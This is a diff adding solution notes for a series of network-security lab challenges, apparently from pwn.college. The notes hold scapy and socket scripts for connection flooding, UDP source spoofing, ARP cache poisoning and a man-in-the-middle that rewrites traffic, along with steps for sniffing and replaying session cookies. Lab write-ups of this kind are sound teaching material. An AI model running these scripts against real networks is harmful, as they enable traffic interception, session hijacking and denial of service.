@@ -1,0 +1,562 @@
+1) Connect
+
+nc 10.0.0.2 31337
+
+2) Send
+
+nc 10.0.0.2 31337
+Hello, World!
+
+3) Shutdown
+
+From man nc:
+-N      shutdown(2) the network socket after EOF on the input.
+
+nc 10.0.0.2 31337 -N
+Ctrl+D
+
+4) Listen
+
+nc -l 31337
+
+5) Scan 1
+
+for i in $(seq 1 254); do ping -c 1 -t 1 10.0.0.$i & done
+
+or
+
+for ip in 10.0.0.{1..254}; do ping -c 1 -t 1 ${ip} & done
+
+then:
+nc [correct IP] 31337
+
+6) Scan 2
+
+nmap 10.0.0.0/16 -T5 --open -n --max-retries 1 --host-timeout 2s -p31337 --min-rate 2000
+
+then:
+nc [correct IP] 31337
+
+7) Monitor 1
+
+tcpdump -c 4 -i any port 31337 -n -A
+
+8) Monitor 2
+
+timeout 60 tshark -i any -f "tcp port 31337" -s 0 -w pcap; tshark -nr pcap -Y 'tcp.payload' -T fields -e tcp.payload | xxd -r -p && echo ''
+
+9) Sniffing Cookies
+
+Run the dojo in Desktop mode, open a terminal window and run /challenge/run, and then run Wireshark inside it. Use the filter "ip.dst == 10.0.0.2&&http" or "http.cookie" and you will see the packet we need.
+On the bottom left expand the Hypertext Transfer Protocol tab and you will see the cookie value.
+
+session=[something]
+
+Or alternatively:
+tcpdump -c 10 -i any port 80 -n -A -w pcap; grep -a "Cookie" pcap
+
+Then, within the /challenge/run harness, run:
+curl http://10.0.0.2/flag -b "session=[something]" to make a request with the cookie, as doing so without the flag just gives you a "NOPE".
+
+10) Network Configuration
+
+In this challenge we're told that a remote host at 10.0.0.2 is trying to communicate with a host at 10.0.0.3 through port 31337.
+
+ip a add 10.0.0.3 dev eth0; nc -tnlp 31337
+
+11) Firewall 1
+
+"Your host at 10.0.0.1 is receiving traffic on port 31337; block that traffic."
+
+iptables -A INPUT -p tcp --dport 31337 -j DROP
+
+12) Firewall 2
+
+"Your host at 10.0.0.1 is receiving traffic on port 31337; block that traffic, but only from the remote host at 10.0.0.3, you must allow traffic from the remote host at 10.0.0.2."
+
+iptables -A INPUT -p tcp -s 10.0.0.3 --dport 31337 -j DROP
+
+13) Firewall 3
+
+"From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337. This time, we have blocked outbound traffic to port 31337, so you'll have to allow it first."
+
+iptables -F OUTPUT; nc 10.0.0.2 31337
+
+14) Denial of Service 1
+
+"The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service."
+
+nc 10.0.0.2 31337
+
+15) Denial of Service 2
+
+"The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.
+
+This time the server forks a new process for each client connection."
+
+for i in $(seq 1 100); do nc 10.0.0.2 31337 & done
+
+16) Denial of Service 3
+
+"The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.
+
+This time the server forks a new process for each client connection, and limits each session to 1 second."
+
+
+class ServerHost(Host):
+
+    def entrypoint(self):
+
+        class ForkingTCPHandler(socketserver.BaseRequestHandler):
+
+            def handle(self):
+
+                self.request.settimeout(1)
+
+                try:
+
+                    self.request.recv(1024)
+
+                except (TimeoutError, socket.timeout):
+
+                    return
+
+
+
+        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
+
+            server.serve_forever()
+
+
+
+class ClientHost(Host):
+
+    def entrypoint(self):
+
+        while True:
+
+            try:
+
+                with socket.create_connection(("10.0.0.2", 31337), timeout=60) as client_socket:
+
+                    client_socket.sendall(b"Hello, World!\n")
+
+                time.sleep(1)
+
+            except (TimeoutError, socket.timeout) as e:
+
+                print(flag, flush=True)
+
+                break
+
+            except (OSError, ConnectionError):
+
+                continue
+
+As we can see, we have to make sure that 10.0.0.3 can't reach 10.0.0.2. If we cause socket.timeout we will get the flag.
+
+
+Used this script to overwhelm the server into giving the flag.
+
+
+import socket
+import threading
+import time
+
+TARGET_IP = "10.0.0.2"
+TARGET_PORT = 31337
+THREAD_COUNT = 1000000
+
+def connect_and_close():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect((TARGET_IP, TARGET_PORT))
+        s.close()
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        pass
+
+
+print(f"Spawning {THREAD_COUNT} threads...")
+threads = []
+for i in range(THREAD_COUNT):
+    t = threading.Thread(target=connect_and_close, daemon=True)
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+print("Waiting for flag.")
+
+try:
+    while True:
+        time.sleep(10)
+except KeyboardInterrupt:
+    print("Exiting")
+
+
+
+
+17) Ethernet
+
+"Manually send an Ethernet packet. The packet should have Ether type=0xFFFF. The packet should be sent to the remote host at 10.0.0.2."
+
+scapy
+my_frame = Ether(type=0xffff) / IP(dst="10.0.0.2"); sendp(my_frame)
+
+18) IP
+
+"Manually send an Internet Protocol packet. The packet should have IP proto=0xFF. The packet should be sent to the remote host at 10.0.0.2."
+
+scapy
+my_packet = IP(proto=0xFF, dst="10.0.0.2"); send(my_packet)
+
+19) TCP
+
+"Manually send a Transmission Control Protocol packet. The packet should have TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF. The packet should be sent to the remote host at 10.0.0.2."
+
+my_packet = IP(dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF"); send(my_packet)
+
+20) TCP Handshake
+
+"Manually perform a Transmission Control Protocol handshake. The initial packet should have TCP sport=31337, dport=31337, seq=31337. The handshake should occur with the remote host at 10.0.0.2."
+
+ip = IP(dst="10.0.0.2"); SYN = TCP(sport=31337, dport=31337, seq=31337, flags="S"); SYNACK = sr1(ip/SYN); ACK=TCP(sport=31337, dport=31337, seq=31338, ack=SYNACK.seq+1, flags="A"); send(ip/ACK)
+
+So basically:
+			   
+[10.0.0.1]		[10.0.0.2]
+
+        ------------->
+	SYN(seq=A)
+
+	<-------------
+	SYNACK(seq=B, ack=A+1)
+
+	------------->
+	ACK(seq=A+1, ack=B+1)
+
+21) UDP
+
+"From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337, and send the message: Hello, World!\n."
+
+scapy
+my_packet = IP(dst="10.0.0.2") / UDP(dport=31337,sport=31337) / b"Hello, World!\n"; resp = sr1(my_packet); print(resp.load)
+
+or with Python sockets:
+
+import socket; IP="10.0.0.2";PORT=31337;MESSAGE=b"Hello, World!\n";sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);sock.sendto(MESSAGE, (IP, PORT));print(sock.recvfrom(1024))
+
+22) UDP 2
+
+"Though we didn't explore this for TCP, in addition to selecting the destination port, both TCP and UDP can set their source port. We'll practice that here --- you can set the source port with s.bind on the socket, exactly how a server does it to set their listening port. Read the source code of /challenge/run to see what source port you'll need!"
+Here's the code that concerns us:
+
+try:
+                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
+                if client_port == 31338 and client_message == b"Hello, World!\n":
+                    server_socket.sendto(flag.encode(), (client_host, client_port))
+            except ConnectionError:
+                continue
+
+So, we're supposed to send an UDP packet with the message "Hello, World!\n" to 10.0.0.2:31337 from port 31338.
+
+python3 -c 'import socket; server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); server.bind(("10.0.0.1", 31338)); server.sendto(b"Hello, World!\n", ("10.0.0.2", 31337)); server.recvfrom(1024)'
+
+or with Scapy:
+
+my_packet = IP(dst="10.0.0.2") / UDP(dport=31337,sport=31338) / b"Hello, World!\n"; resp = sr1(my_packet); print(resp.load)
+
+23) UDP Spoofing 1
+
+"There are two dangers to UDP: first, it is often used in places where people are already cutting corners for performence's sake. Second, it forces the programmer to keep track of sessions explicitly. This combination can cause security issues.
+
+In this challenge, one side of the connection can confuse a non-trusted connection for a trusted connection, and print the flag. Can you trigger this confusion?"
+
+scapy
+my_packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(dport=31338,sport=31337) / b"FLAG"; send(my_packet)
+
+24) UDP Spoofing 2
+
+"There is a fairly wide gap between the features that TCP provides and UDP's barebones nature. Sometimes, developers want some of those features, and end up reimplementing just those that they need on top of UDP. This leads to weird situations, such as the ability to trigger outbound traffic to other servers, with a potential application to Denial of Service amplification.
+
+Rather than leaking the flag directly, this challenge allows you to redirect it to another server. Can you catch it on the other side?"
+
+The challenge code that concerns us:
+
+class ServerHost(Host):                                                                                                                           
+    def entrypoint(self):                                               
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                                                          
+        server_socket.bind(("0.0.0.0", 31337))                                                                                                    
+        while True:                                                     
+            try:                                                        
+                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
+                if client_message.strip() == b"ACTION?":                                                                                          
+                    server_socket.sendto(b"NONE", (client_host, client_port))
+            except ConnectionError:                                      
+                continue                                                                                                                          
+                  
+class ClientHost(Host):                                                 
+    def entrypoint(self):                                                
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+        client_socket.bind(("0.0.0.0", 31338))                           
+        while True:
+            time.sleep(1)
+            try:                    
+                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))    
+                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
+                if peer_port == 31337 and message.startswith(b"FLAG"):   
+                    _, flag_host, flag_port = message.strip().split(b":") 
+                    client_socket.sendto(flag.encode(), (flag_host, int(flag_port)))
+            except (ConnectionError, ValueError):                        
+                continue
+
+So as we can see, to trick the client as if it received the packet it expects, we can send an UDP packet with a message of "FLAG:IP:PORT" to receive the flag at that IP and port.
+
+
+In one window:
+nc -tunlp 8081
+
+In another window:
+
+scapy
+my_packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(dport=31338,sport=31337) / b"FLAG:10.0.0.1:8081"; send(my_packet)
+
+25) UDP Spoofing 3
+
+This time, the client socket doesn't bind() so it uses a random port.
+
+In one window:
+nc -tunlp 8081
+
+In another window:
+
+scapy
+for i in range(32768, 60999):
+	my_packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(dport=i,sport=31337) / b"FLAG:10.0.0.1:8081"; send(my_packet)
+
+26) UDP Spoofing 4
+
+Same solution as above.
+
+27) ARP
+
+"Manually send an Address Resolution Protocol packet. The packet should inform the remote host that the IP address 10.0.0.42 can be found at the Ethernet address 42:42:42:42:42:42. The packet should be sent to the remote host at 10.0.0.2."
+
+scapy
+sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.42", hwsrc="42:42:42:42:42:42", pdst="10.0.0.2"))
+
+28) Intercept
+
+from scapy.all import *
+
+iface = conf.iface  
+your_mac = get_if_hwaddr(iface)
+mac2 = getmacbyip("10.0.0.2")
+mac3 = getmacbyip("10.0.0.3")
+
+def poison():
+    pkt = Ether(src=your_mac, dst=mac2)/ARP(op=2, psrc="10.0.0.3", pdst="10.0.0.2",
+                                            hwsrc=your_mac, hwdst=mac2)
+    while True:
+        sendp(pkt, iface=iface, verbose=0)
+        time.sleep(0.1)
+
+def forward(pkt):
+    if pkt[Ether].src == your_mac:
+        return 
+    if IP in pkt and TCP in pkt and pkt[IP].src=="10.0.0.2" and pkt[IP].dst=="10.0.0.3" and pkt[TCP].dport==31337:
+        payload = bytes(pkt[TCP].payload)
+        if payload:
+            try:
+                print(payload.decode(errors="ignore"))
+            except:
+                print(repr(payload))
+        pkt[Ether].src = your_mac
+        pkt[Ether].dst = mac3
+        del pkt[IP].chksum, pkt[TCP].chksum
+        sendp(pkt, iface=iface, verbose=0)
+
+import threading, time
+threading.Thread(target=poison, daemon=True).start()
+sniff(iface=iface, prn=forward, store=0)
+
+29) MitM
+
+"Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337."
+
+So, we have to intercept traffic between two hosts here.
+Here is the challenge code:
+
+class AuthenticatedClientHost(Host):
+    def entrypoint(self):
+        while True:
+            try:
+                client_socket = socket.socket()
+                client_socket.connect(("10.0.0.3", 31337))
+
+                assert client_socket.recv(1024) == b"secret: "
+                secret = bytes(server_host.secret)  # Get the secret out-of-band
+                time.sleep(1)
+                client_socket.sendall(secret.hex().encode())
+
+                assert client_socket.recv(1024) == b"command: "
+                time.sleep(1)
+                client_socket.sendall(b"echo")
+                time.sleep(1)
+                client_socket.sendall(b"Hello, World!")
+                assert client_socket.recv(1024) == b"Hello, World!"
+
+                client_socket.close()
+                time.sleep(1)
+
+            except (OSError, ConnectionError, TimeoutError, AssertionError):
+                continue
+
+class AuthenticatedServerHost(Host):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.secret = multiprocessing.Array("B", 32)
+
+    def entrypoint(self):
+        server_socket = socket.socket()
+        server_socket.bind(("0.0.0.0", 31337))
+        server_socket.listen()
+        while True:
+            try:
+                connection, _ = server_socket.accept()
+
+                self.secret[:] = os.urandom(32)
+                time.sleep(1)
+                connection.sendall(b"secret: ")
+                secret = bytes.fromhex(connection.recv(1024).decode())
+                if secret != bytes(self.secret):
+                    connection.close()
+                    continue
+
+                time.sleep(1)
+                connection.sendall(b"command: ")
+                command = connection.recv(1024).decode().strip()
+
+                if command == "echo":
+                    data = connection.recv(1024)
+                    time.sleep(1)
+                    connection.sendall(data)
+                elif command == "flag":
+                    time.sleep(1)
+                    connection.sendall(flag.encode())
+
+                connection.close()
+            except ConnectionError:
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+client_host = AuthenticatedClientHost("ip-10-0-0-2")
+server_host = AuthenticatedServerHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1",
+                         client_host: "10.0.0.2",
+                         server_host: "10.0.0.3"},
+                  subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(environ=parent_process.environ())
+
+So from this we can infer that the client gets a secret value from within the script, and sends it to the server and the server confirms that the secret is correct. Only from then the rest of the connection commences. 
+
+After confirming the secret value is correct, the server sends a "command:" message and if the client sends "echo" "Hello, World!" the server responds in kind. However if instead of "echo" it receives "flag" it will send out the flag. So I had the idea of letting them do the secret exchange, and changing the packet with the "echo" command into a packet that has "flag" in it.
+
+
+
+This is my solution's code:
+
+from scapy.all import *
+import threading, time
+
+iface = conf.iface
+
+your_mac = get_if_hwaddr(iface)
+
+client_ip = "10.0.0.2"
+server_ip = "10.0.0.3"
+
+client_mac = getmacbyip("10.0.0.2")
+server_mac = getmacbyip("10.0.0.3")
+
+verbosity=0
+
+def poison():
+	pkt1 = Ether(src=your_mac, dst=client_mac)/ARP(op=2, psrc=server_ip, pdst=client_ip, hwsrc=your_mac, hwdst=client_mac)
+	pkt2 = Ether(src=your_mac, dst=server_mac)/ARP(op=2, psrc=client_ip, pdst=server_ip, hwsrc=your_mac, hwdst=server_mac)
+
+	while True:
+		sendp(pkt1, iface=iface, verbose=0)
+		sendp(pkt2, iface=iface, verbose=0)
+		time.sleep(0.5)
+
+def packet_handler(packet):
+	if not packet.haslayer(IP):
+		return
+	if packet[IP].src == client_ip:
+		if packet.haslayer(Raw):
+			print(f"[CLIENT ->] {packet[Raw].load}")
+		packet[Ether].src = your_mac
+		packet[Ether].dst = server_mac
+
+		if packet.haslayer(Raw) and packet[Raw].load == b"echo":
+			packet[Raw].load = b"flag"		# to get the flag
+
+		del packet[IP].chksum
+		if packet.haslayer(TCP):
+			del packet[TCP].chksum
+
+		print("Forwarding client packet to server.")
+		sendp(packet, iface=iface, verbose=verbosity)
+	elif packet[IP].src == server_ip:
+		if packet.haslayer(Raw):
+			print(f"[<- SERVER] {packet[Raw].load}")
+		packet[Ether].src = your_mac
+		packet[Ether].dst = client_mac
+		del packet[IP].chksum
+		if packet.haslayer(TCP):
+			del packet[TCP].chksum
+
+		print("Forwarding server packet to client.")
+		sendp(packet, iface=iface, verbose=verbosity)
+
+bpf_filter = f"ether src {client_mac} or ether src {server_mac}"
+threading.Thread(target=poison, daemon=True).start()
+print("Poison threads started.")
+print(f"Starting sniffer. Filter: {bpf_filter}")
+a = sniff(iface=iface, filter=bpf_filter, prn=packet_handler)
+
+
+
+
+And, this was the result:
+
+Forwarding client packet to server.
+Forwarding server packet to client.
+Forwarding client packet to server.
+[<- SERVER] b'secret: '
+Forwarding server packet to client.
+Forwarding client packet to server.
+[CLIENT ->] b'94bd250037d4f6d6b9bbff34e7d9c6be56e2b2326dc92818e4b2e09e5313a9ea'
+
+^as we can see this is the secret key
+
+Forwarding client packet to server.
+Forwarding server packet to client.
+[<- SERVER] b'command: '
+Forwarding server packet to client.
+Forwarding client packet to server.
+[CLIENT ->] b'echo'
+
+^we intercept this and change "echo" to "flag"
+
+Forwarding client packet to server.
+Forwarding server packet to client.
+[CLIENT ->] b'Hello, World!'
+Forwarding client packet to server.
+Forwarding server packet to client.
+[<- SERVER] b'pwn.college{FLAG}\n'
